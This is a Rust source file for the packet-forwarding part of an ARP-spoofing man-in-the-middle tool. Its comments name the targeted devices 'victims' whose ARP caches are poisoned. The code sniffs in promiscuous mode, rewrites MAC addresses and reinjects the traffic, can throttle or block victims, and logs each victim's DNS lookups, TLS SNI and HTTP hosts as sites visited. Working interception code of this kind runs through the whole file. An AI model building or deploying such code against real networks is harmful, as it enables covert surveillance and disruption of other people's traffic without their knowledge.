//! l2_forwarder.rs
//! ================
//! Strict Layer-2 packet forwarder. Captures every IPv4 packet on the wire,
//! rewrites MAC addresses according to the forwarding rules below, and
//! reinjects modified packets via pcap.
//!
//! Blueprint 3.B - Outbound (Victim -> Internet):
//!   if Ether.src is a monitored victim MAC:
//!       Ether.dst = gateway_mac
//!       Ether.src = local_mac
//!       reinject
//!
//! Blueprint 3.C - Inbound (Internet -> Victim):
//!   if Ether.src == gateway_mac:
//!       parse IPv4.dst, look up in registry
//!       if monitored:
//!           Ether.dst = victim_mac
//!           Ether.src = local_mac
//!           reinject
//!
//! Anti-loop BPF filter (Blueprint 3.A):
//!   ip and not host <local_ip> and not ether src <local_mac>
//! This prevents the host from sniffing its own injected packets.
//!
//! FIX #2: Bytes are now counted ONLY after a successful pcap send.
//! If sendpacket fails, tokens are refunded to the token bucket so
//! throttled devices don't permanently lose bandwidth.

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Mutex;

use pcap::Capture;
use pcap::Device as PcapDevice;
use pnet_packet::ethernet::{EtherTypes, EthernetPacket};
use pnet_packet::ipv4::Ipv4Packet;
use pnet_packet::tcp::TcpPacket;
use pnet_packet::udp::UdpPacket;
use pnet_packet::Packet;
use pnet::util::MacAddr;

use crate::device_registry::REGISTRY;

/// Parse a MAC address string like "aa:bb:cc:dd:ee:ff" into [u8; 6].
pub fn parse_mac_to_bytes(mac: &str) -> Result<[u8; 6], String> {
    let parts: Vec<u8> = mac
        .split(':')
        .map(|h| u8::from_str_radix(h, 16).map_err(|e| format!("hex parse '{}' : {}", h, e)))
        .collect::<Result<Vec<u8>, _>>()?;
    if parts.len() != 6 {
        return Err(format!("expected 6 octets, got {}", parts.len()));
    }
    let mut out = [0u8; 6];
    out.copy_from_slice(&parts);
    Ok(out)
}

pub struct L2Forwarder {
    iface: String,
    local_ip: String,
    local_mac: String,
    gateway_mac: String,
    capture_handle: Mutex<Option<Capture<pcap::Active>>>,
    send_handle: Mutex<Option<Capture<pcap::Active>>>,
    /// Cumulative count of packets forwarded (rewritten and reinjected).
    pub packets_forwarded: AtomicU64,
    /// DEBUG: total packets captured (for diagnostics).
    pub packets_seen: AtomicU64,
    /// Signal the forwarding loop to exit (set by close_capture on shutdown).
    stop_flag: AtomicBool,
}

impl L2Forwarder {
    pub fn new(iface: &str, local_ip: &str, local_mac: &str, gateway_mac: &str) -> Self {
        println!(
            "[L2FORWARD] Created forwarder: iface={} local_ip={} local_mac={} gateway_mac={}",
            iface, local_ip, local_mac, gateway_mac
        );
        Self {
            iface: iface.to_string(),
            local_ip: local_ip.to_string(),
            local_mac: local_mac.to_lowercase(),
            gateway_mac: gateway_mac.to_lowercase(),
            capture_handle: Mutex::new(None),
            send_handle: Mutex::new(None),
            packets_forwarded: AtomicU64::new(0),
            packets_seen: AtomicU64::new(0),
            stop_flag: AtomicBool::new(false),
        }
    }

    /// Open the read/capture handle with the anti-loop BPF filter.
    pub fn open_capture(&self) -> Result<(), String> {
        let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
        let dev = devices
            .into_iter()
            .find(|d| d.name == self.iface)
            .ok_or_else(|| format!("interface '{}' not found", self.iface))?;

        let mut cap = Capture::from_device(dev)
            .map_err(|e| format!("pcap open device: {}", e))?
            .promisc(true)
            .snaplen(65535)
            .timeout(100)
            .immediate_mode(true)
            .open()
            .map_err(|e| format!("pcap open capture: {}", e))?;

        // Anti-loop BPF filter (Blueprint 3.A)
        let filter = format!(
            "ip and not host {} and not ether src {}",
            self.local_ip, self.local_mac
        );
        cap.filter(&filter, true)
            .map_err(|e| format!("pcap filter '{}' : {}", filter, e))?;
        println!("[L2FORWARD] Capture opened with BPF: {}", filter);

        let mut guard = self.capture_handle.lock().unwrap();
        *guard = Some(cap);
        Ok(())
    }

    /// Open the injection/send handle.
    pub fn open_send(&self) -> Result<(), String> {
        let devices = PcapDevice::list().map_err(|e| format!("pcap device list: {}", e))?;
        let dev = devices
            .into_iter()
            .find(|d| d.name == self.iface)
            .ok_or_else(|| format!("interface '{}' not found for send", self.iface))?;

        let cap = Capture::from_device(dev)
            .map_err(|e| format!("pcap open device send: {}", e))?
            .promisc(false)
            .snaplen(65535)
            .timeout(10)
            .open()
            .map_err(|e| format!("pcap open capture send: {}", e))?;

        let mut guard = self.send_handle.lock().unwrap();
        *guard = Some(cap);
        println!("[L2FORWARD] Send handle opened.");
        Ok(())
    }

    /// Return the number of packets forwarded since startup.
    pub fn stats_pkts(&self) -> u64 {
        self.packets_forwarded.load(Ordering::Relaxed)
    }

    /// Blocking forwarding loop. Call from `spawn_blocking`.
    pub fn run_forwarding_loop(&self) -> Result<(), String> {
        println!("[L2FORWARD] Starting forwarding loop...");

        let mut consecutive_errors: u32 = 0;
        let mut last_debug_print = std::time::Instant::now();

        loop {
            // Check shutdown flag before each iteration
            if self.stop_flag.load(Ordering::Relaxed) {
                println!("[L2FORWARD] Stop flag set, exiting loop.");
                return Ok(());
            }

            // Extract packet data (copied) while holding the guard,
            // then release the guard before processing.
            let pkt_data: Option<Vec<u8>>;
            {
                let mut guard = self.capture_handle.lock().unwrap();
                let cap = match guard.as_mut() {
                    Some(c) => c,
                    None => return Ok(()),
                };
                match cap.next_packet() {
                    Ok(pkt) => {
                        pkt_data = Some(pkt.data.to_vec());
                        consecutive_errors = 0;
                        let seen = self.packets_seen.fetch_add(1, Ordering::Relaxed);
                        // DEBUG: print packet count every 5 seconds
                        if last_debug_print.elapsed().as_secs() >= 5 {
                            let fwd = self.packets_forwarded.load(Ordering::Relaxed);
                            println!(
                                "[L2FORWARD] packets_seen={} packets_forwarded={}",
                                seen + 1,
                                fwd
                            );
                            last_debug_print = std::time::Instant::now();
                        }
                    }
                    Err(pcap::Error::TimeoutExpired) => {
                        pkt_data = None;
                        consecutive_errors = 0;
                    }
                    Err(pcap::Error::NoMorePackets) => return Ok(()),
                    Err(e) => {
                        eprintln!("[L2FORWARD] capture error: {}", e);
                        pkt_data = None;
                        consecutive_errors += 1;
                    }
                }
            } // guard dropped here

            // ---- pcap auto-recovery ----
            if consecutive_errors >= 50 {
                eprintln!(
                    "[L2FORWARD] {} consecutive pcap errors — attempting recovery...",
                    consecutive_errors
                );
                // Drop the broken capture handle
                {
                    let mut guard = self.capture_handle.lock().unwrap();
                    *guard = None;
                }

                let mut recovered = false;
                for attempt in 1..=5 {
                    match self.open_capture() {
                        Ok(()) => {
                            println!("[L2FORWARD] pcap recovered (attempt {})", attempt);
                            consecutive_errors = 0;
                            recovered = true;
                            break;
                        }
                        Err(e) => {
                            eprintln!(
                                "[L2FORWARD] recovery attempt {}/5 failed: {}",
                                attempt, e
                            );
                            if attempt < 5 {
                                std::thread::sleep(std::time::Duration::from_secs(2));
                            }
                        }
                    }
                }

                if !recovered {
                    eprintln!("[L2FORWARD] All 5 recovery attempts failed. Exiting.");
                    self.stop_flag.store(true, Ordering::Relaxed);
                    return Err("pcap recovery exhausted after 5 attempts".to_string());
                }
            }

            if let Some(ref data) = pkt_data {
                self.process_packet(data);
            }
        }
    }

    /// Process a single captured packet.
    fn process_packet(&self, data: &[u8]) {
        let eth = match EthernetPacket::new(data) {
            Some(e) => e,
            None => return,
        };

        let ethertype = eth.get_ethertype();

        // Only handle IPv4
        if ethertype != EtherTypes::Ipv4 {
            return;
        }

        let source_mac = eth.get_source();
        let source_str = mac_addr_to_str(&source_mac);

        // Parse inner IPv4
        let ipv4 = match Ipv4Packet::new(eth.payload()) {
            Some(ip) => ip,
            None => return,
        };

        let _ip_src = format!("{}", ipv4.get_source());
        let ip_dst = format!("{}", ipv4.get_destination());

        // ---- Blueprint 3.B - Outbound (Victim -> Internet) ----
        //
        // DIRECTION LOGIC (from intercepting host's perspective):
        //   Ether.src == monitored device MAC  →  this device is UPLOADING
        //   (packet originated from the victim, heading out to the internet)
        //
        // Also handle the grace-period case: a device that was just
        // un-monitored still has its ARP cache poisoned, so we keep
        // forwarding for 2 seconds while the ARP restore takes effect.
        let outbound_forward = REGISTRY.is_monitored_by_mac(&source_str)
            || REGISTRY.is_in_grace_period(&source_str, 2.0);

        if outbound_forward {
            // DROP if device is blocked
            if REGISTRY.is_blocked_mac(&source_str) {
                return;
            }

            let len = data.len() as u64;

            // FIX #2: Token bucket speed limit check — tokens consumed here
            if !REGISTRY.allow_packet(&source_str, len) {
                // Speed limit exceeded — drop the packet (no token consumed)
                return;
            }

            // === SITES VISITED INSPECTION ===
            let ip_payload = ipv4.payload();
            // Check for DNS query (UDP dst port 53)
            if let Some(udp) = UdpPacket::new(ip_payload) {
                if udp.get_destination() == 53 {
                    if let Some(domain) = extract_dns_query(udp.payload()) {
                        crate::device_registry::REGISTRY.record_visit(&source_str, domain);
                    }
                }
            } else if let Some(tcp) = TcpPacket::new(ip_payload) {
                let dst_port = tcp.get_destination();
                if dst_port == 443 {
                    if let Some(sni) = extract_tls_sni(tcp.payload()) {
                        crate::device_registry::REGISTRY.record_visit(&source_str, sni);
                    }
                } else if dst_port == 80 {
                    if let Some(host) = extract_http_host(tcp.payload()) {
                        crate::device_registry::REGISTRY.record_visit(&source_str, host);
                    }
                }
            }

            // FIX #2: Only count bytes & packet after successful send.
            // On failure, refund tokens so bandwidth isn't permanently lost.
            if self.rewrite_and_send(
                data,
                &self.gateway_mac,    // new Ether.dst
                &self.local_mac,      // new Ether.src
            ) {
                // Source MAC is the monitored device → this is UPLOAD for that device
                REGISTRY.add_ul(&source_str, len);
                self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
            } else {
                // Send failed — refund tokens consumed by allow_packet
                REGISTRY.refund_tokens(&source_str, len);
            }
            return;
        }

        // ---- Blueprint 3.C - Inbound (Internet -> Victim) ----
        //
        // DIRECTION LOGIC (from intercepting host's perspective):
        //   Ether.src == gateway MAC  AND  IP.dst == device IP
        //   → that device is DOWNLOADING (packet from internet destined for device)
        //
        // NOTE: We use IP.dst (not Ether.dst) because ARP poisoning causes the
        // gateway to send frames to OUR MAC for all victim IPs.  The IP header
        // still contains the victim's real IP as the destination.
        if source_str == self.gateway_mac {
            if let Some(dev) = REGISTRY.get_by_ip(&ip_dst) {
                // Grace period: forward even if no longer monitored
                let inbound_forward = dev.is_monitored
                    || REGISTRY.is_in_grace_period(&dev.mac, 2.0);

                if inbound_forward {
                    // DROP if destination device is blocked
                    if REGISTRY.is_blocked_mac(&dev.mac) {
                        return;
                    }

                    let len = data.len() as u64;

                    // FIX #2: Token bucket speed limit check — tokens consumed here
                    if !REGISTRY.allow_packet(&dev.mac, len) {
                        // Speed limit exceeded — drop the packet
                        return;
                    }

                    // FIX #2: Only count bytes & packet after successful send.
                    if self.rewrite_and_send(
                        data,
                        &dev.mac,           // new Ether.dst = victim MAC
                        &self.local_mac,    // new Ether.src = host MAC
                    ) {
                        // Gateway→Device → this is DOWNLOAD for that device
                        REGISTRY.add_dl(&dev.mac, len);
                        self.packets_forwarded.fetch_add(1, Ordering::Relaxed);
                    } else {
                        // Send failed — refund tokens consumed by allow_packet
                        REGISTRY.refund_tokens(&dev.mac, len);
                    }
                }
            }
        }
    }

    /// Rewrite MAC addresses and reinject the packet.
    /// Returns true on successful send, false on failure.
    fn rewrite_and_send(&self, orig_data: &[u8], new_dst: &str, new_src: &str) -> bool {
        let new_dst_bytes = match parse_mac_to_bytes(new_dst) {
            Ok(b) => b,
            Err(_) => return false,
        };
        let new_src_bytes = match parse_mac_to_bytes(new_src) {
            Ok(b) => b,
            Err(_) => return false,
        };

        let mut new_pkt = orig_data.to_vec();
        if new_pkt.len() < 14 {
            return false;
        }

        new_pkt[0..6].copy_from_slice(&new_dst_bytes);
        new_pkt[6..12].copy_from_slice(&new_src_bytes);

        // Pad to 60 bytes (minimum Ethernet frame size) to avoid
        // Windows Npcap error 31 (ERROR_GEN_FAILURE) on injection.
        const MIN_ETH_FRAME: usize = 60;
        if new_pkt.len() < MIN_ETH_FRAME {
            new_pkt.resize(MIN_ETH_FRAME, 0u8);
        }

        let mut guard = self.send_handle.lock().unwrap();
        if let Some(ref mut cap) = *guard {
            match cap.sendpacket(new_pkt.as_slice()) {
                Ok(()) => true,
                Err(e) => {
                    eprintln!("[L2FORWARD] !! sendpacket error: {}", e);
                    false
                }
            }
        } else {
            false
        }
    }

    /// Close the capture handle and signal the forwarding loop to exit.
    pub fn close_capture(&self) {
        self.stop_flag.store(true, Ordering::Relaxed);
        let mut guard = self.capture_handle.lock().unwrap();
        *guard = None;
        println!("[L2FORWARD] Capture handle closed, stop flag set.");
    }
}

fn mac_addr_to_str(mac: &MacAddr) -> String {
    // pnet_macros::MacAddr has fields .0 through .5
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        mac.0, mac.1, mac.2, mac.3, mac.4, mac.5
    )
}

fn extract_dns_query(payload: &[u8]) -> Option<String> {
    if payload.len() < 12 { return None; }
    let qdcount = u16::from_be_bytes([payload[4], payload[5]]);
    if qdcount == 0 { return None; }
    decode_dns_name(payload, 12)
}

fn decode_dns_name(data: &[u8], mut offset: usize) -> Option<String> {
    let mut labels = Vec::new();
    let mut iterations = 0;
    loop {
        if iterations > 20 || offset >= data.len() { break; }
        iterations += 1;
        let len = data[offset] as usize;
        if len == 0 { break; }
        if (data[offset] & 0xC0) == 0xC0 {
            if offset + 1 >= data.len() { break; }
            let ptr = (((data[offset] & 0x3F) as usize) << 8) | data[offset + 1] as usize;
            offset = ptr;
            continue;
        }
        offset += 1;
        if offset + len > data.len() { break; }
        if let Ok(label) = std::str::from_utf8(&data[offset..offset + len]) {
            labels.push(label.to_string());
        }
        offset += len;
    }
    if labels.is_empty() { None } else { Some(labels.join(".")) }
}

fn extract_tls_sni(payload: &[u8]) -> Option<String> {
    if payload.len() < 5 || payload[0] != 0x16 { return None; }
    let record_len = u16::from_be_bytes([payload[3], payload[4]]) as usize;
    if payload.len() < 5 + record_len { return None; }
    let hs = &payload[5..5 + record_len];
    if hs.len() < 4 || hs[0] != 0x01 { return None; }
    let ch = &hs[4..];
    if ch.len() < 38 { return None; }
    let mut off = 2 + 32;
    if off >= ch.len() { return None; }
    let sid_len = ch[off] as usize; off += 1 + sid_len;
    if off + 2 > ch.len() { return None; }
    let cs_len = u16::from_be_bytes([ch[off], ch[off+1]]) as usize; off += 2 + cs_len;
    if off >= ch.len() { return None; }
    let comp_len = ch[off] as usize; off += 1 + comp_len;
    if off + 2 > ch.len() { return None; }
    let ext_len = u16::from_be_bytes([ch[off], ch[off+1]]) as usize; off += 2;
    let end = off + ext_len;
    while off + 4 <= end && off + 4 <= ch.len() {
        let ext_type = u16::from_be_bytes([ch[off], ch[off+1]]);
        let elen = u16::from_be_bytes([ch[off+2], ch[off+3]]) as usize;
        off += 4;
        if ext_type == 0x0000 {
            if off + 5 > ch.len() { break; }
            let sni_off = off + 2;
            let name_type = ch[sni_off];
            let name_len = u16::from_be_bytes([ch[sni_off+1], ch[sni_off+2]]) as usize;
            let name_start = sni_off + 3;
            if name_type == 0 && name_start + name_len <= ch.len() {
                return std::str::from_utf8(&ch[name_start..name_start+name_len]).ok().map(|s| s.to_string());
            }
            break;
        }
        off += elen;
    }
    None
}

fn extract_http_host(payload: &[u8]) -> Option<String> {
    let text = std::str::from_utf8(payload).ok()?;
    for line in text.split("\r\n") {
        let lower = line.to_lowercase();
        if lower.starts_with("host:") {
            let host = line[5..].trim();
            let host = host.split(':').next().unwrap_or(host);
            if !host.is_empty() { return Some(host.to_string()); }
        }
    }
    None
}
